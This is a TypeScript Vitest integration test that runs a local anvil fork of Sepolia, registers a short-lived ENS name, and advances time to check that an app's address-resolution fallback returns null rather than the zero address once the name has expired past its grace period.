import { getOwner as getOwnerV2 } from '@ensdomains/ensjs/public/v2'

const LOG = (...args: unknown[]) => console.log('[expiry-edge:fork]', ...args)

const UPSTREAM_RPC = 'https://ethereum-sepolia-rpc.publicnode.com'
const ANVIL_PORT = 8557
const ANVIL_URL = `http://127.0.0.1:${ANVIL_PORT}`
const ANVIL_BIN = process.env.ANVIL_BIN ?? 'anvil' // foundry's anvil on PATH; override via env

const GRACE_PERIOD = 2_419_200n // read live from the registrar (28d)
const REG_DURATION = GRACE_PERIOD + 86_400n // 29 days (>= any sane min duration)
const MINT_AMOUNT = 1_000n * 10n ** 18n

const daiMintAbi = parseAbi(['function mint(address to, uint256 amount)'])
const registrarAbi = parseAbi([
  'function makeCommitment(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, bytes32 referrer) view returns (bytes32)',
  'function commit(bytes32 commitment)',
  'function register(string label, address owner, bytes32 secret, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 referrer)',
  'function isAvailable(string label) view returns (bool)',
  'event NameRegistered(uint256 indexed tokenId, string label, address owner, address subregistry, address resolver, uint64 duration, address paymentToken, bytes32 indexed referrer, uint256 base, uint256 premium)',
])

let resolveAddressOrName: typeof import('@/features/roles/helpers/addUser.handlers').resolveAddressOrName
let REGISTRAR: Address
let DAI: Address
let sepoliaWithEns: typeof import('@/lib/wagmi').sepoliaWithEns

let anvil: ChildProcess | null = null
let publicClient: ReturnType<typeof createPublicClient>
let testClient: ReturnType<typeof createTestClient>
let ownerWallet: ReturnType<typeof createWalletClient>
let OWNER: Address

const waitReceipt = async (hash: Hex) =>
  publicClient.waitForTransactionReceipt({ hash })

const registerName = async (label: string) => {
  const secret = generatePrivateKey()
  const commitment = await publicClient.readContract({
    address: REGISTRAR,
    abi: registrarAbi,
    functionName: 'makeCommitment',
    args: [label, OWNER, secret, zeroAddress, zeroAddress, REG_DURATION, zeroHash],
  })
  expect(
    (await waitReceipt(
      await ownerWallet.writeContract({
        address: REGISTRAR,
        abi: registrarAbi,
        functionName: 'commit',
        args: [commitment],
      }),
    )).status,
  ).toBe('success')
  await testClient.increaseTime({ seconds: 61 })
  await testClient.mine({ blocks: 1 })
  const hash = await ownerWallet.writeContract({
    address: REGISTRAR,
    abi: registrarAbi,
    functionName: 'register',
    args: [label, OWNER, secret, zeroAddress, zeroAddress, REG_DURATION, DAI, zeroHash],
  })
  const receipt = await waitReceipt(hash)
  expect(receipt.status).toBe('success')
  const ev = parseEventLogs({ abi: registrarAbi, logs: receipt.logs }).find(
    (l) => l.eventName === 'NameRegistered',
  )
  expect(ev && ev.args.owner).toBe(OWNER)
  LOG(`registered ${label}.eth owner=${OWNER} duration=${REG_DURATION}s resolver=0x0`)
}

const rand = () => Math.floor(Math.random() * 1_000_000).toString().padStart(6, '0')
const LABEL = `rtexp${rand()}`

beforeAll(async () => {
  vi.stubEnv('VITE_SEPOLIA_RPC_URL', ANVIL_URL)

  const upstream = createPublicClient({
    transport: http(UPSTREAM_RPC, { retryCount: 8, retryDelay: 1_500 }),
  })
  let pinnedBlock = 0n
  for (let attempt = 1; attempt <= 6; attempt++) {
    try {
      pinnedBlock = await upstream.getBlockNumber()
      break
    } catch (error) {
      LOG(`pin attempt ${attempt} failed: ${(error as Error).message.slice(0, 100)}`)
      if (attempt === 6) throw error
      await delay(3_000 * attempt)
    }
  }
  LOG(`pinned Sepolia block: ${pinnedBlock}`)

  const anvilTail: string[] = []
  const capture = (chunk: Buffer) => {
    anvilTail.push(chunk.toString())
    if (anvilTail.length > 200) anvilTail.shift()
  }
  anvil = spawn(
    ANVIL_BIN,
    [
      '--fork-url', UPSTREAM_RPC,
      '--fork-block-number', pinnedBlock.toString(),
      '--port', String(ANVIL_PORT),
      '--block-time', '1',
    ],
    { stdio: ['ignore', 'pipe', 'pipe'] },
  )
  anvil.stdout?.on('data', capture)
  anvil.stderr?.on('data', capture)
  let anvilExit: number | null = null
  anvil.on('exit', (code) => {
    anvilExit = code
  })

  ;({ resolveAddressOrName } = await import(
    '@/features/roles/helpers/addUser.handlers'
  ))
  ;({ sepoliaWithEns } = await import('@/lib/wagmi'))
  const { getRenewerAddress } = await import('@/features/renew/utils/renewer')
  REGISTRAR = getRenewerAddress(true)
  const { SUPPORTED_TOKENS } = await import('@/lib/constants/tokens')
  DAI = SUPPORTED_TOKENS.DAI

  const transport = () =>
    http(ANVIL_URL, { retryCount: 8, retryDelay: 1_000, timeout: 60_000 })
  publicClient = createPublicClient({ chain: sepoliaWithEns, transport: transport() })
  testClient = createTestClient({
    mode: 'anvil',
    chain: sepoliaWithEns,
    transport: transport(),
  })

  const deadline = Date.now() + 120_000
  for (;;) {
    if (anvilExit !== null)
      throw new Error(
        `anvil exited early code=${anvilExit}; tail:\n${anvilTail.join('').slice(-2000)}`,
      )
    try {
      if ((await publicClient.getChainId()) === 11155111) break
    } catch {
    }
    if (Date.now() > deadline) throw new Error('anvil fork not ready in 120s')
    await delay(1_000)
  }

  const owner = privateKeyToAccount(generatePrivateKey())
  OWNER = owner.address
  ownerWallet = createWalletClient({
    account: owner,
    chain: sepoliaWithEns,
    transport: transport(),
  })
  await testClient.setBalance({ address: OWNER, value: 10n ** 19n })
  expect(
    (await waitReceipt(
      await ownerWallet.writeContract({
        address: DAI,
        abi: daiMintAbi,
        functionName: 'mint',
        args: [OWNER, MINT_AMOUNT],
      }),
    )).status,
  ).toBe('success')
  expect(
    (await waitReceipt(
      await ownerWallet.writeContract({
        address: DAI,
        abi: erc20Abi,
        functionName: 'approve',
        args: [REGISTRAR, MINT_AMOUNT],
      }),
    )).status,
  ).toBe('success')
  LOG('setup ok', { registrar: REGISTRAR, owner: OWNER })
}, 240_000)

afterAll(async () => {
  vi.unstubAllEnvs()
  if (anvil && anvil.exitCode === null) {
    anvil.kill('SIGKILL')
    await delay(500)
  }
  anvil = null
})

describe('edge probe: expired-name edge of resolveAddressOrName owner fallback', () => {
  it('registers a short-lived recordless name; sanity: fallback resolves to owner while live', async () => {
    expect(
      await publicClient.readContract({
        address: REGISTRAR,
        abi: registrarAbi,
        functionName: 'isAvailable',
        args: [LABEL],
      }),
    ).toBe(true)
    await registerName(LABEL)

    const out = await resolveAddressOrName({
      client: publicClient as never,
      nameOrAddress: `${LABEL}.eth`,
    })
    expect(out?.toLowerCase()).toBe(OWNER.toLowerCase())
    LOG(`while live: resolveAddressOrName(${LABEL}.eth) → ${out} (= owner, fallback fires)`)
  }, 240_000)

  it('within grace period (expired but < 28d): documents what the fallback returns', async () => {
    await testClient.increaseTime({ seconds: Number(REG_DURATION) + 3600 })
    await testClient.mine({ blocks: 1 })

    let ownerRead: unknown = '<threw>'
    try {
      ownerRead = await getOwnerV2(publicClient as never, { name: `${LABEL}.eth` })
    } catch (error) {
      ownerRead = `<threw: ${(error as Error).message.slice(0, 120)}>`
    }
    const out = await resolveAddressOrName({
      client: publicClient as never,
      nameOrAddress: `${LABEL}.eth`,
    })
    LOG(
      `IN GRACE: getOwnerV2 → ${ownerRead}; resolveAddressOrName → ${out} ` +
        `(former owner ${OWNER})`,
    )
    expect(out?.toLowerCase()).not.toBe(zeroAddress)
  }, 120_000)

  it('past expiry + grace: fallback must fail CLOSED (null), never 0x0', async () => {
    await testClient.increaseTime({ seconds: Number(GRACE_PERIOD) + 3600 })
    await testClient.mine({ blocks: 1 })

    let ownerRead: unknown = '<threw>'
    try {
      ownerRead = await getOwnerV2(publicClient as never, { name: `${LABEL}.eth` })
    } catch (error) {
      ownerRead = `<threw: ${(error as Error).message.slice(0, 120)}>`
    }
    LOG(`PAST GRACE: getOwnerV2(${LABEL}.eth) → ${ownerRead}`)

    const out = await resolveAddressOrName({
      client: publicClient as never,
      nameOrAddress: `${LABEL}.eth`,
    })
    LOG(
      `PAST GRACE: resolveAddressOrName(${LABEL}.eth) → ${out} ` +
        '(null = app blocks the form as "unresolved"; 0x0 = sinks would target zero)',
    )
    expect(out).toBeNull()
  }, 120_000)
})
```
